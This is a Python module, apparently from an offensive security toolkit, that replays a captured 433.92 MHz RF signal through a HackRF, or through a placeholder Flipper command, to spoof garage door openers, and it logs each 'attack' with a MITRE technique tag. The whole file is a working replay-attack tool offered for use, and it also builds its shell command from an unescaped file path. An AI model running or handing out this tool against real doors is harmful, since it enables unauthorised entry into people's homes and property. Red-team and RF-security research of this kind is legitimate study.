# modules/exploits/garage_rf_spoofer.py

import argparse
import subprocess
import os
import json
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1200"  # Hardware Additions (RF replay devices)

def log_garage_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def replay_rf_signal(file_path, device="hackrf"):
    print(f"[+] Replaying RF garage door signal using {device.upper()}...")

    if device == "hackrf":
        cmd = f"hackrf_transfer -t {file_path} -f 433920000 -x 47"
    elif device == "flipper":
        cmd = f"flipper_tool send {file_path}"  # Placeholder for real command
    else:
        print("[!] Unsupported device")
        return

    try:
        subprocess.run(cmd, shell=True, check=True)
        print("[âœ“] Signal replayed successfully")
    except subprocess.CalledProcessError as e:
        print(f"[!] Replay failed: {e}")

    log_garage_attack({
        "timestamp": datetime.utcnow().isoformat(),
        "device": device,
        "signal_file": file_path,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Garage RF Signal Spoofer")
    parser.add_argument("--file", required=True, help="Path to RF capture (.bin or .sub)")
    parser.add_argument("--device", default="hackrf", choices=["hackrf", "flipper"])
    args = parser.parse_args()

    replay_rf_signal(args.file, args.device)
